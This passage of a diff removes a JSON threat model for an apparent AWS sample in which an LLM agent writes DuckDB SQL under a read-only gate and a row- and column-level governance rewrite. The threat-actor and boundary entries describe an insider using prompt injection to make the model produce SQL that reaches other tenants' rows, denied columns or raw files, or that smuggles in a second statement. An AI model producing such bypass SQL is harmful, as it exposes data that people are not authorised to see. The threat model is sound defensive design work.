-      "specific_service": "Amazon Cognito",
-      "version": null,
-      "description": "Identity provider: user pool with custom:tenant/custom:role attributes; app client (with secret) using USER_PASSWORD_AUTH. Issues ID tokens whose aud = app client id; the runtime authorizer validates allowedAudience against it.",
-      "configuration": null
-    },
-    {
-      "id": "C003",
-      "name": "AgentCore Runtime + inbound JWT authorizer (managed)",
-      "type": "Compute",
-      "service_provider": "AWS",
-      "specific_service": "Amazon Bedrock AgentCore Runtime",
-      "version": null,
-      "description": "One microVM per session; hosts the agent process. Managed customJWTAuthorizer validates the Cognito ID token (signature via discovery URL, allowedAudience) BEFORE agent code runs; requestHeaderAllowlist forwards Authorization. Serves the async-generator entrypoint as SSE. AWS-managed, out of sample scope.",
-      "configuration": null
-    },
-    {
-      "id": "C004",
-      "name": "Identity resolution (_resolve_claims)",
-      "type": "Security",
-      "service_provider": null,
-      "specific_service": null,
-      "version": null,
-      "description": "agent.py: extracts claims in trust order: verified JWT claims (custom:tenant/custom:role normalized to tenant/role) -> X-Amzn-Bedrock-AgentCore-Runtime-User-Id header (SigV4 caller asserts) -> payload identity object -> default role. jwt.decode(verify_signature=False) is claims EXTRACTION from a token already verified by the managed authorizer.",
-      "configuration": null
-    },
-    {
-      "id": "C005",
-      "name": "Strands Agent + Bedrock Claude",
-      "type": "Compute",
-      "service_provider": "AWS",
-      "specific_service": "Amazon Bedrock",
-      "version": null,
-      "description": "LLM writes SQL from natural-language questions; reads tool results; emits streaming events. Its SQL output is untrusted input to the pipeline. The streaming entrypoint maps Strands events to typed SSE envelopes including the per-statement gate/govern/execute trace.",
-      "configuration": null
-    },
-    {
-      "id": "C006",
-      "name": "run_sql gate (single-statement + read-only)",
-      "type": "Security",
-      "service_provider": null,
-      "specific_service": null,
-      "version": null,
-      "description": "agent.py: async-generator tool. Gate strips leading SQL comments for keyword classification, requires EXACTLY ONE statement (duckdb.extract_statements — the engine's own parser, no lexer divergence), and allowlists read statements + CREATE TEMP TABLE/VIEW; rejects persistent writes, ATTACH, COPY TO, and multi-statement smuggling. First control in the SQL pipeline; emits gate trace events.",
-      "configuration": null
-    },
-    {
-      "id": "C007",
-      "name": "Governance rewrite (governance.py)",
-      "type": "Security",
-      "service_provider": null,
-      "specific_service": null,
-      "version": null,
-      "description": "AuthZ layer: principal->role->policy (unknown role in a known tenant falls back to that tenant's MOST restricted policy, content-derived ranking); sqlglot AST rewrite — RLS predicates via guarded subqueries, schema-aware CLS EXCLUDE, explicit denied-column selection rejected with a legible policy error, raw table functions governed by an AST-shape ALLOWLIST (only exp.Identifier FROM/JOIN sources; pure generators excepted), fail-closed on parse failure. Runs after the gate, before the engine; emits govern trace events (rls[]/cls[]/rejection).",
-      "configuration": null
-    },
-    {
-      "id": "C008",
-      "name": "DuckDB engine (in-process)",
-      "type": "Analytics",
-      "service_provider": null,
-      "specific_service": null,
-      "version": null,
-      "description": "In-memory embedded OLAP engine; dies with the session; READ_ONLY catalog attaches; resource envelope via memory_limit + spill. Executes only gated+governed single statements under _conn_lock serialization.",
-      "configuration": null
-    },
-    {
-      "id": "C009",
-      "name": "CloudWatch Logs",
-      "type": "Other",
-      "service_provider": "AWS",
-      "specific_service": "Amazon CloudWatch",
-      "version": null,
-      "description": "Runtime logs incl. per-query engine metrics and governed flag.",
-      "configuration": null
-    }
-  ],
-  "connections": [
-    {
-      "id": "CN001",
-      "source_id": "C001",
-      "destination_id": "C002",
-      "protocol": "HTTPS",
-      "port": 443,
-      "encryption": true,
-      "description": "UI logs the user in (USER_PASSWORD_AUTH + SECRET_HASH); Cognito returns ID/access/refresh tokens. UI keeps the ID token for the bearer header."
-    },
-    {
-      "id": "CN002",
-      "source_id": "C001",
-      "destination_id": "C003",
-      "protocol": "HTTPS",
-      "port": 443,
-      "encryption": true,
-      "description": "UI POSTs {prompt} to the runtime /invocations endpoint with Authorization: Bearer <ID token> and a session id header; consumes the SSE envelope stream (text/reasoning/tool_start/trace/result) back. The managed authorizer validates the token before agent code runs."
-    },
-    {
-      "id": "CN003",
-      "source_id": "C003",
-      "destination_id": "C004",
-      "protocol": "HTTPS",
-      "port": null,
-      "encryption": true,
-      "description": "Runtime invokes the agent entrypoint with allowlisted headers (Authorization JWT already validated by the managed authorizer) + payload. Claims extraction happens in _resolve_claims."
-    },
-    {
-      "id": "CN004",
-      "source_id": "C004",
-      "destination_id": "C007",
-      "protocol": "Other",
-      "port": null,
-      "encryption": true,
-      "description": "Resolved principal (tenant:role) sets the active role for the session; governance resolves role -> policy (unknown role -> tenant's most restricted)."
-    },
-    {
-      "id": "CN005",
-      "source_id": "C005",
-      "destination_id": "C006",
-      "protocol": "Other",
-      "port": null,
-      "encryption": true,
-      "description": "LLM emits SQL via the run_sql tool call; enters the single-statement read-only gate. UNTRUSTED input crossing."
-    },
-    {
-      "id": "CN006",
-      "source_id": "C006",
-      "destination_id": "C007",
-      "protocol": "Other",
-      "port": null,
-      "encryption": true,
-      "description": "Gate-passed single statement enters the governance rewrite (RLS/CLS injection, denied-column rejection, raw-path allowlist, fail-closed parse)."
-    },
-    {
-      "id": "CN007",
-      "source_id": "C007",
-      "destination_id": "C008",
-      "protocol": "Other",
-      "port": null,
-      "encryption": true,
-      "description": "Governed SQL executes on the in-process engine under _conn_lock serialization."
-    },
-    {
-      "id": "CN008",
-      "source_id": "C008",
-      "destination_id": "D001",
-      "protocol": "HTTPS",
-      "port": 443,
-      "encryption": true,
-      "description": "Engine reads S3/Iceberg/DuckLake data over httpfs with the execution role's scoped read-only credentials (SigV4, TLS)."
-    },
-    {
-      "id": "CN009",
-      "source_id": "C008",
-      "destination_id": "D002",
-      "protocol": "HTTPS",
-      "port": 443,
-      "encryption": true,
-      "description": "Engine reads the label-table Parquet files (attribution joins) with the same scoped read-only role."
-    },
-    {
-      "id": "CN010",
-      "source_id": "C008",
-      "destination_id": "D003",
-      "protocol": "HTTPS",
-      "port": 443,
-      "encryption": true,
-      "description": "Optional: fetch DuckLake PostgreSQL catalog credentials from Secrets Manager at attach time."
-    },
-    {
-      "id": "CN011",
-      "source_id": "C005",
-      "destination_id": "C003",
-      "protocol": "HTTPS",
-      "port": 443,
-      "encryption": true,
-      "description": "Agent model loop calls Amazon Bedrock (Claude) via the runtime's execution role; streaming events flow back through the entrypoint to the SSE channel."
-    },
-    {
-      "id": "CN012",
-      "source_id": "C003",
-      "destination_id": "C009",
-      "protocol": "HTTPS",
-      "port": 443,
-      "encryption": true,
-      "description": "Runtime/agent logs to CloudWatch incl. engine metrics and governed flag."
-    }
-  ],
-  "dataStores": [
-    {
-      "id": "D001",
-      "name": "S3 analytical data (4 access paths)",
-      "type": "Object Storage",
-      "classification": "Public",
-      "encryption_at_rest": true,
-      "backup_frequency": null,
-      "description": "Amazon S3 / S3 Tables / Glue Data Catalog / DuckLake: same logical tables reachable via raw Parquet glob, S3 Tables Iceberg REST, Glue federated Iceberg REST, and DuckLake catalog. All attached READ_ONLY. Buckets: SSE, BlockPublicAccess.BLOCK_ALL, enforce_ssl. Sample data public; customer-substituted data may be confidential."
-    },
-    {
-      "id": "D002",
-      "name": "Label tables on S3 (OFAC + synthetic CEX)",
-      "type": "Object Storage",
-      "classification": "Internal",
-      "encryption_at_rest": true,
-      "backup_frequency": null,
-      "description": "ofac_addresses.parquet (real public OFAC SDN list) and cex_deposit_labels.parquet (synthetic; subject_identity mimics KYC linkage and is the CLS-protected column) under LABELS_PREFIX on the hardened bucket."
-    },
-    {
-      "id": "D003",
-      "name": "Secrets Manager (DuckLake PG credentials)",
-      "type": "Other",
-      "classification": "Restricted",
-      "encryption_at_rest": true,
-      "backup_frequency": null,
-      "description": "AWS Secrets Manager: optional PostgreSQL catalog credentials for the multi-writer DuckLake form; fetched at runtime by the execution role; never in env or code."
-    }
-  ],
-  "threatActors": [
-    {
-      "id": "TA001",
-      "type": "Insider Threat",
-      "name": "Insider",
-      "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
-      "motivations": [
-        "Financial gain",
-        "Revenge / grievance"
-      ],
-      "resources": "Individual",
-      "description": "The model's PRIMARY adversary: a legitimately authenticated but restricted analyst (valid Cognito login, restricted tenant:role) who crafts natural-language questions to steer the LLM into SQL that bypasses the RLS/CLS rewrite — cross-tenant rows, denied columns, raw file reads, or multi-statement smuggling.",
-      "priority": 1,
-      "is_relevant": true,
-      "reviewed": true,
-      "relationship_to_target": "Internal",
-      "state_nexus": "None",
-      "targeting_specificity": "Targeted"
-    },
-    {
-      "id": "TA002",
-      "type": "External Attacker",
-      "name": "External Attacker",
-      "sophistication_tier": "Tier 1 - Opportunistic / script kiddie",
-      "motivations": [
-        "Financial gain"
-      ],
-      "resources": "Club / small group",
-      "description": "External party probing a deployed sample's public runtime endpoint: forged/absent JWTs, token-audience confusion, or replaying captured bearer tokens.",
-      "priority": 2,
-      "is_relevant": true,
-      "reviewed": true,
-      "relationship_to_target": "External",
-      "state_nexus": "None",
-      "targeting_specificity": "Opportunistic"
-    },
-    {
-      "id": "TA003",
-      "type": "Nation-State / APT",
-      "name": "Nation-state Actor",
-      "sophistication_tier": "Tier 5 - Nation-state APT / elite",
-      "motivations": [
-        "Espionage / intelligence collection"
-      ],
-      "resources": "Government",
-      "description": "A state intelligence or military group operating with advanced capabilities",
-      "priority": 0,
-      "is_relevant": false,
-      "reviewed": true,
-      "relationship_to_target": "External",
-      "state_nexus": "State-executed",
-      "targeting_specificity": "Targeted"
-    },
-    {
-      "id": "TA004",
-      "type": "Hacktivist",
-      "name": "Hacktivist",
-      "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
-      "motivations": [
-        "Ideological / hacktivism"
-      ],
-      "resources": "Contest / crowd",
-      "description": "An individual or group motivated by ideological or political beliefs",
-      "priority": 0,
-      "is_relevant": false,
-      "reviewed": true,
-      "relationship_to_target": "External",
-      "state_nexus": "None",
-      "targeting_specificity": "Sector-focused"
-    },
-    {
-      "id": "TA005",
-      "type": "Financially Motivated Cybercriminal / Organized Crime",
-      "name": "Organized Crime",
-      "sophistication_tier": "Tier 3 - Organized cybercrime",
-      "motivations": [
-        "Financial gain"
-      ],
-      "resources": "Organization",
-      "description": "A criminal organization with significant resources",
-      "priority": 0,
-      "is_relevant": false,
-      "reviewed": true,
-      "relationship_to_target": "External",
-      "state_nexus": "None",
-      "targeting_specificity": "Opportunistic"
-    },
-    {
-      "id": "TA006",
-      "type": "Competitor / Corporate Espionage",
-      "name": "Competitor",
-      "sophistication_tier": "Tier 3 - Organized cybercrime",
-      "motivations": [
-        "Competitive advantage",
-        "Espionage / intelligence collection"
-      ],
-      "resources": "Organization",
-      "description": "A business competitor seeking competitive advantage",
-      "priority": 0,
-      "is_relevant": false,
-      "reviewed": true,
-      "relationship_to_target": "External",
-      "state_nexus": "None",
-      "targeting_specificity": "Targeted"
-    },
-    {
-      "id": "TA007",
-      "type": "Script Kiddie / Novice",
-      "name": "Script Kiddie",
-      "sophistication_tier": "Tier 1 - Opportunistic / script kiddie",
-      "motivations": [
-        "Thrill-seeking / notoriety"
-      ],
-      "resources": "Individual",
-      "description": "Opportunistic scanning of exposed demo deployments (default test users with a documented password are provisioned by the sample's CDK — rotating them is the deployer's job).",
-      "priority": 5,
-      "is_relevant": true,
-      "reviewed": true,
-      "relationship_to_target": "External",
-      "state_nexus": "None",
-      "targeting_specificity": "Opportunistic"
-    },
-    {
-      "id": "TA008",
-      "type": "Disgruntled Employee",
-      "name": "Disgruntled Employee",
-      "sophistication_tier": "Tier 1 - Opportunistic / script kiddie",
-      "motivations": [
-        "Revenge / grievance"
-      ],
-      "resources": "Individual",
-      "description": "A current or former employee with a grievance",
-      "priority": 0,
-      "is_relevant": false,
-      "reviewed": true,
-      "relationship_to_target": "Internal",
-      "state_nexus": "None",
-      "targeting_specificity": "Targeted"
-    },
-    {
-      "id": "TA009",
-      "type": "Privileged User",
-      "name": "Privileged User",
-      "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
-      "motivations": [
-        "Financial gain"
-      ],
-      "resources": "Individual",
-      "description": "Operator misconfiguration as an unintentional threat: malformed GOVERNANCE_POLICIES, deploying without the inbound authorizer, or leaking the Cognito app client secret.",
-      "priority": 4,
-      "is_relevant": true,
-      "reviewed": true,
-      "relationship_to_target": "Internal",
-      "state_nexus": "None",
-      "targeting_specificity": "Targeted"
-    },
-    {
-      "id": "TA010",
-      "type": "Third Party",
-      "name": "Third Party",
-      "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
-      "motivations": [
-        "Financial gain"
-      ],
-      "resources": "Organization",
-      "description": "A compromised calling application on the SigV4 path (local/CLI), able to assert arbitrary tenant:role via the user-id header or payload identity — documented trust assumption, unused under the deployed JWT authorizer.",
-      "priority": 3,
-      "is_relevant": true,
-      "reviewed": true,
-      "relationship_to_target": "Partner / third-party",
-      "state_nexus": "None",
-      "targeting_specificity": "Opportunistic"
-    },
-    {
-      "id": "TA011",
-      "type": "Terrorist Organization",
-      "name": "Terrorist Organization",
-      "sophistication_tier": "Tier 2 - Hacktivist / campaign-driven",
-      "motivations": [
-        "Ideological / hacktivism",
-        "Disruption / destruction"
-      ],
-      "resources": "Club / small group",
-      "description": "A group with limited offensive cyber capability, primarily using the internet for propaganda and recruitment",
-      "priority": 0,
-      "is_relevant": false,
-      "reviewed": true,
-      "relationship_to_target": "External",
-      "state_nexus": "None",
-      "targeting_specificity": "Sector-focused"
-    },
-    {
-      "id": "TA012",
-      "type": "Private Sector Offensive Actor / Cyber Mercenary",
-      "name": "Private Sector Offensive Actor",
-      "sophistication_tier": "Tier 4 - State-nexus / advanced",
-      "motivations": [
-        "Financial gain"
-      ],
-      "resources": "Organization",
-      "description": "A commercial vendor developing zero-day exploits and spyware for client-selected targets",
-      "priority": 0,
-      "is_relevant": false,
-      "reviewed": true,
-      "relationship_to_target": "External",
-      "state_nexus": "State-aligned",
-      "targeting_specificity": "Targeted"
-    }
-  ],
-  "trustZones": [
-    {
-      "id": "TZ001",
-      "name": "Client side (UI + end user + LLM output)",
-      "trust_level": "Untrusted",
-      "contained_nodes": [
-        "C001",
-        "C005"
-      ],
-      "description": "The Streamlit UI runs on the analyst's machine (holds ID token + app client secret in process env/memory); natural-language questions from end users AND the SQL the LLM generates from them. Prompt injection makes LLM output attacker-influenced."
-    },
-    {
-      "id": "TZ002",
-      "name": "AWS managed platform",
-      "trust_level": "High",
-      "contained_nodes": [
-        "C002",
-        "C003",
-        "C009"
-      ],
-      "description": "Cognito user pool (token issuance), AgentCore Runtime + managed JWT authorizer (microVM isolation, pre-code token validation), Bedrock service, CloudWatch. AWS-operated; trusted per the shared-responsibility model."
-    },
-    {
-      "id": "TZ003",
-      "name": "Agent process (sample code)",
-      "trust_level": "Medium",
-      "contained_nodes": [
-        "C004",
-        "C006",
-        "C007",
-        "C008"
-      ],
-      "description": "The session's microVM process: identity resolution, single-statement read-only gate, governance rewrite, in-process DuckDB. Executes untrusted SQL under layered controls; one session = one principal = one engine."
-    },
-    {
-      "id": "TZ004",
-      "name": "Customer account data plane",
-      "trust_level": "High",
-      "contained_nodes": [
-        "D001",
-        "D002",
-        "D003"
-      ],
-      "description": "S3 buckets/catalogs (analytical data + label tables), Secrets Manager entries in the customer's own account, reached only via the scoped read-only execution role."
-    }
-  ],
-  "crossingPoints": [
-    {
-      "id": "CP001",
-      "source_zone_id": "TZ001",
-      "destination_zone_id": "TZ002",
-      "connection_ids": [
-        "CN001"
-      ],
-      "authentication_method": "Password",
-      "authorization_method": "None",
-      "description": "UI login at Cognito (USER_PASSWORD_AUTH + SECRET_HASH with the app client secret); Cognito issues ID/access/refresh tokens."
-    },
-    {
-      "id": "CP002",
-      "source_zone_id": "TZ001",
-      "destination_zone_id": "TZ002",
-      "connection_ids": [
-        "CN002"
-      ],
-      "authentication_method": "Token",
-      "authorization_method": "Policy-based",
-      "description": "UI invokes the runtime with Authorization: Bearer <Cognito ID token>; the managed customJWTAuthorizer validates signature (discovery URL) and allowedAudience BEFORE any agent code; no-token=401, forged=403. SSE envelope stream returns over the same channel."
-    },
-    {
-      "id": "CP003",
-      "source_zone_id": "TZ002",
-      "destination_zone_id": "TZ003",
-      "connection_ids": [
-        "CN003"
-      ],
-      "authentication_method": "Token",
-      "authorization_method": "Role-based",
-      "description": "Verified identity crosses from the managed authorizer into agent code as claims; _resolve_claims normalizes custom:tenant/custom:role -> tenant:role (JWT decode without re-verification is claims EXTRACTION, not authentication). Weaker fallback sources (user-id header / payload identity) are SigV4-caller-asserted."
-    },
-    {
-      "id": "CP004",
-      "source_zone_id": "TZ001",
-      "destination_zone_id": "TZ003",
-      "connection_ids": [
-        "CN005"
-      ],
-      "authentication_method": "None",
-      "authorization_method": "Policy-based",
-      "description": "LLM-generated SQL (attacker-influenceable via prompt injection) crosses into the agent process. THE central boundary: single-statement read-only gate, then governance rewrite."
-    },
-    {
-      "id": "CP005",
-      "source_zone_id": "TZ003",
-      "destination_zone_id": "TZ004",
-      "connection_ids": [
-        "CN008",
-        "CN009",
-        "CN010"
-      ],
-      "authentication_method": "IAM Role",
-      "authorization_method": "Role-based",
-      "description": "Engine reads S3/catalog/label data and Secrets Manager with the scoped read-only execution role over TLS. Only governed SQL output flows back."
-    },
-    {
-      "id": "CP006",
-      "source_zone_id": "TZ001",
-      "destination_zone_id": "TZ002",
-      "connection_ids": [
-        "CN011"
-      ],
-      "authentication_method": "IAM Role",
-      "authorization_method": "Role-based",
-      "description": "Agent model loop calls Amazon Bedrock (Claude) with the runtime execution role; prompts carry untrusted user text, responses carry untrusted SQL."
-    }
-  ],
-  "trustBoundaries": [
-    {
-      "id": "TB001",
-      "name": "Inbound AuthN edge (Cognito + managed authorizer)",
-      "type": "Network",
-      "crossing_points": [
-        "CP001",
-        "CP002"
-      ],
-      "controls": [
-        "Cognito user pool AuthN (USER_PASSWORD_AUTH + SECRET_HASH)",
-        "AgentCore customJWTAuthorizer: signature via discovery URL + allowedAudience validation BEFORE agent code",
-        "requestHeaderAllowlist limits forwarded headers to Authorization",
-        "TLS on all calls"
-      ],
-      "description": "The deployed sample's real authentication perimeter: only requests carrying a valid Cognito ID token for the configured audience reach a runtime session. Verified: no-token=401, forged-token=403, both pre-code."
-    },
-    {
-      "id": "TB002",
-      "name": "Platform -> agent identity handoff",
-      "type": "Virtual Machine",
-      "crossing_points": [
-        "CP003"
-      ],
-      "controls": [
-        "Managed authorizer verifies before agent code",
-        "claims normalization custom:tenant/custom:role -> tenant:role",
-        "trust-ordered fallback chain with default-role floor",
-        "unknown role in a known tenant -> tenant's MOST restricted policy (content-derived ranking, order-independent)"
-      ],
-      "description": "Verified identity crosses from the managed authorizer into agent code as claims. AuthN happens platform-side; the sample only consumes verified claims. SigV4 fallback identity sources are caller-asserted (documented trust assumption, local/CLI path only)."
-    },
-    {
-      "id": "TB003",
-      "name": "Untrusted SQL -> agent controls",
-      "type": "Process",
-      "crossing_points": [
-        "CP004",
-        "CP006"
-      ],
-      "controls": [
-        "single-statement rule via duckdb.extract_statements (engine's own parser)",
-        "leading-comment stripping before keyword classification",
-        "read-only statement allowlist (read + CREATE TEMP)",
-        "governance rewrite: RLS guarded subqueries, schema-aware CLS EXCLUDE",
-        "explicit denied-column selection rejected with a legible policy error",
-        "raw table functions: AST-shape ALLOWLIST (Identifier sources only; pure generators excepted)",
-        "fail-closed on unparseable SQL"
-      ],
-      "description": "LLM-generated SQL (attacker-influenceable via prompt injection) crosses into the agent process. THE central boundary of this model. All controls mutation-tested (Phase 7.5)."
-    },
-    {
-      "id": "TB004",
-      "name": "Agent -> customer data plane",
-      "type": "Account",
-      "crossing_points": [
-        "CP005"
-      ],
-      "controls": [
-        "scoped read-only IAM execution role",
-        "READ_ONLY catalog attaches",
-        "TLS in transit",
-        "SSE + BlockPublicAccess + enforce_ssl on buckets",
-        "Secrets Manager for PG credentials"
-      ],
-      "description": "Engine reads S3/catalog/label data with the scoped read-only execution role over TLS. Only governed SQL output flows back."
-    }
-  ],
-  "assets": [
-    {
-      "id": "A001",
-      "name": "Governed analytical rows/columns",
-      "type": "Data",
-      "classification": "Internal",
-      "lifecycle_state": null,
-      "data_states": [
-        "At rest",
-        "In transit",
-        "In use"
-      ],
-      "description": "The per-tenant visible slice of the analytical + label tables (rows within the tenant's policy window; columns minus denies, e.g. subject_identity). The thing the authorization layer protects; sample data is public/synthetic, customer-substituted data may be confidential.",
-      "owner": null,
-      "criticality": 4,
-      "metadata": {}
-    },
-    {
-      "id": "A002",
-      "name": "Cognito ID token (tenant/role claims)",
-      "type": "Token",
-      "classification": "Confidential",
-      "lifecycle_state": null,
-      "data_states": [
-        "In transit",
-        "In use"
-      ],
-      "description": "Bearer of identity: aud = app client id; custom:tenant/custom:role drive policy selection. Theft or forgery = principal impersonation for the token lifetime.",
-      "owner": null,
-      "criticality": 5,
-      "metadata": {}
-    },
-    {
-      "id": "A003",
-      "name": "Cognito app client secret",
-      "type": "Credential",
-      "classification": "Restricted",
-      "lifecycle_state": null,
-      "data_states": [
-        "At rest",
-        "In use"
-      ],
-      "description": "Needed (with a user password) to complete USER_PASSWORD_AUTH. Held in the UI process env; not in the repo.",
-      "owner": null,
-      "criticality": 3,
-      "metadata": {}
-    },
-    {
-      "id": "A004",
-      "name": "GOVERNANCE_POLICIES configuration",
-      "type": "Configuration",
-      "classification": "Internal",
-      "lifecycle_state": null,
-      "data_states": [
-        "At rest",
-        "In use"
-      ],
-      "description": "The authorization policy table (row filters, column denies, raw-path switch, per tenant:role). Its correctness IS the authorization posture.",
-      "owner": null,
-      "criticality": 4,
-      "metadata": {}
-    },
-    {
-      "id": "A005",
-      "name": "Agent-generated SQL (untrusted)",
-      "type": "Data",
-      "classification": "Internal",
-      "lifecycle_state": null,
-      "data_states": [
-        "In transit",
-        "In use"
-      ],
-      "description": "LLM output derived from user natural language; adversarial by assumption (prompt injection). Every statement passes gate + governance before execution.",
-      "owner": null,
-      "criticality": 4,
-      "metadata": {}
-    }
-  ],
-  "flows": [
-    {
-      "id": "F001",
-      "asset_id": "A002",
-      "source_id": "C002",
-      "destination_id": "C001",
-      "transformation_type": "Signing",
-      "controls": [
-        "Authentication",
-        "Encryption"
-      ],
-      "description": "Cognito issues the signed ID token to the UI after USER_PASSWORD_AUTH.",
-      "protocol": "HTTPS",
-      "encryption": true,
-      "authenticated": true,
-      "authorized": false,
-      "validated": false,
-      "risk_level": null
-    },
-    {
-      "id": "F002",
-      "asset_id": "A002",
-      "source_id": "C001",
-      "destination_id": "C003",
-      "transformation_type": "Verification",
-      "controls": [
-        "Authentication",
-        "Encryption"
-      ],
-      "description": "UI presents the bearer token; the managed authorizer verifies signature + audience before agent code.",
-      "protocol": "HTTPS",
-      "encryption": true,
-      "authenticated": true,
-      "authorized": false,
-      "validated": false,
-      "risk_level": null
-    },
-    {
-      "id": "F003",
-      "asset_id": "A003",
-      "source_id": "C001",
-      "destination_id": "C002",
-      "transformation_type": "Hashing",
-      "controls": [
-        "Authentication",
-        "Encryption"
-      ],
-      "description": "App client secret used for SECRET_HASH during login; never leaves the UI process except as the HMAC.",
-      "protocol": "HTTPS",
-      "encryption": true,
-      "authenticated": true,
-      "authorized": false,
-      "validated": false,
-      "risk_level": null
-    },
-    {
-      "id": "F004",
-      "asset_id": "A005",
-      "source_id": "C005",
-      "destination_id": "C006",
-      "transformation_type": "Processing",
-      "controls": [
-        "Input Validation"
-      ],
-      "description": "Untrusted LLM SQL enters the single-statement read-only gate (comment-strip + engine-parser statement count + keyword allowlist).",
-      "protocol": null,
-      "encryption": true,
-      "authenticated": false,
-      "authorized": false,
-      "validated": true,
-      "risk_level": 4
-    },
-    {
-      "id": "F005",
-      "asset_id": "A005",
-      "source_id": "C006",
-      "destination_id": "C007",
-      "transformation_type": "Processing",
-      "controls": [
-        "Authorization",
-        "Input Validation"
-      ],
-      "description": "Gate-passed statement is rewritten under the principal's policy (RLS/CLS/raw-path allowlist/denied-column rejection; fail-closed parse).",
-      "protocol": null,
-      "encryption": true,
-      "authenticated": false,
-      "authorized": false,
-      "validated": true,
-      "risk_level": 3
-    },
-    {
-      "id": "F006",
-      "asset_id": "A004",
-      "source_id": "C007",
-      "destination_id": "C007",
-      "transformation_type": "Processing",
-      "controls": [
-        "Authorization"
-      ],
-      "description": "Policy table consulted for principal->role->policy resolution (unknown role -> tenant's most restricted; content-derived ranking).",
-      "protocol": null,
-      "encryption": false,
-      "authenticated": false,
-      "authorized": false,
-      "validated": false,
-      "risk_level": null
-    },
-    {
-      "id": "F007",
-      "asset_id": "A001",
-      "source_id": "D001",
-      "destination_id": "C008",
-      "transformation_type": "Redaction",
-      "controls": [
-        "Authorization",
-        "Access Control",
-        "Encryption"
-      ],
-      "description": "Engine reads only the governed subquery's rows/columns from the analytical tables (RLS predicate + CLS EXCLUDE applied in the rewritten SQL).",
-      "protocol": "HTTPS",
-      "encryption": true,
-      "authenticated": false,
-      "authorized": true,
-      "validated": false,
-      "risk_level": null
-    },
-    {
-      "id": "F008",
-      "asset_id": "A001",
-      "source_id": "D002",
-      "destination_id": "C008",
-      "transformation_type": "Redaction",
-      "controls": [
-        "Authorization",
-        "Access Control",
-        "Encryption"
-      ],
-      "description": "Label-table joins under the same governance (tenant sees only its own exchange rows; junior loses subject_identity).",
-      "protocol": "HTTPS",
-      "encryption": true,
-      "authenticated": false,
-      "authorized": true,
-      "validated": false,
-      "risk_level": null
-    },
-    {
-      "id": "F009",
-      "asset_id": "A001",
-      "source_id": "C008",
-      "destination_id": "C001",
-      "transformation_type": "Aggregation",
-      "controls": [
-        "Encryption",
-        "Output Encoding"
-      ],
-      "description": "Governed results (rows JSON + engine metrics + trace envelopes) stream back to the UI over SSE; per-statement trace exposes gate/govern/execute metadata but only policy-permitted data.",
-      "protocol": "HTTPS",
-      "encryption": true,
-      "authenticated": false,
-      "authorized": false,
-      "validated": false,
-      "risk_level": null
-    }
-  ],
-  "residualRiskAssessments": [
-    {
-      "threat_id": "T001",
-      "decision": "Mitigated",
-      "residual_severity": "Low",
-      "residual_likelihood": "Possible",
-      "rationale": "AST-level rewrite covers all four access paths; denied-column selection is a clean pre-engine rejection; cloud-verified per-persona. Residual: novel sqlglot-vs-DuckDB semantic divergence - bounded by fail-closed parsing and a read-only worst case.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T002",
-      "decision": "Mitigated",
-      "residual_severity": "Low",
-      "residual_likelihood": "Unlikely",
-      "rationale": "Unparseable SQL is rejected for restricted principals (fail-closed). A statement would need to parse cleanly in sqlglot AND mean something different to DuckDB - possible but narrow; worst case still read-only within the session.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T003",
-      "decision": "Mitigated",
-      "residual_severity": "Low",
-      "residual_likelihood": "Unlikely",
-      "rationale": "Single-statement rule uses the engine's own parser (no lexer divergence to aim at); mutation-verified; end-to-end test proves the second statement never reaches the engine. Layers 2-3 (READ_ONLY attaches, no write IAM) still bound any residual.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T004",
-      "decision": "Mitigated",
-      "residual_severity": "Low",
-      "residual_likelihood": "Unlikely",
-      "rationale": "Posture inverted to an AST-shape allowlist: new DuckDB file functions are rejected by default rather than slipping past a stale name list. Additions to the generator exception list require explicit justification. Cloud-verified rejection.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T005",
-      "decision": "Mitigated",
-      "residual_severity": "Low",
-      "residual_likelihood": "Unlikely",
-      "rationale": "Fallback is content-derived and declaration-order independent; tested with the two-policy tenant shape that exposed the original bug. Residual: an operator could still author a 'most restricted' policy that is broader than intended - covered by T011.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T006",
-      "decision": "Mitigated",
-      "residual_severity": "Low",
-      "residual_likelihood": "Possible",
-      "rationale": "Platform-enforced pre-code validation (401/403 verified live). Residual: stolen VALID tokens are T008; the platform's authorizer is AWS-managed and out of sample scope.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T007",
-      "decision": "Accepted",
-      "residual_severity": "Medium",
-      "residual_likelihood": "Possible",
-      "rationale": "Documented trust assumption on the local/CLI SigV4 path only: the caller is IAM-authenticated infrastructure trusted to assert its users' identity (standard service-to-service identity propagation). The deployed path uses the JWT authorizer, where these fallback sources are unreachable because the authorizer rejects unauthenticated requests pre-code.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T008",
-      "decision": "Accepted",
-      "residual_severity": "Medium",
-      "residual_likelihood": "Possible",
-      "rationale": "Bearer-token theft is inherent to token auth; lifetime bounds exposure. Demo credentials are documented as rotate-before-exposing (operator responsibility). Analyst-host security is out of scope for a sample. Production guidance: short token TTLs, MFA on the pool, restrict the app client.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T009",
-      "decision": "Accepted",
-      "residual_severity": "Low",
-      "residual_likelihood": "Possible",
-      "rationale": "Inference/side channels against RLS/CLS are an industry-wide limitation of query-rewrite governance (shared with BI-tool row-level security and warehouse RLS). Not-for-production disclaimer + guidance to use physical separation for high-sensitivity multi-tenant data. Sample dataset is public/synthetic.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T010",
-      "decision": "Mitigated",
-      "residual_severity": "Low",
-      "residual_likelihood": "Likely",
-      "rationale": "Blast radius is structurally one microVM; envelope caps memory with spill. Cost exposure is the customer's own account and bounded by their throttles/budgets. Remaining: per-request cost, standard for any LLM app.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T011",
-      "decision": "Accepted",
-      "residual_severity": "Medium",
-      "residual_likelihood": "Possible",
-      "rationale": "Policy authoring is the operator's responsibility (same class as IAM policy authoring). Malformed JSON fail-stops; unknown principals fail closed. Semantic policy lint remains a recommended future hardening (M013 in progress); the governed trace (M011) gives an audit signal.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T012",
-      "decision": "Mitigated",
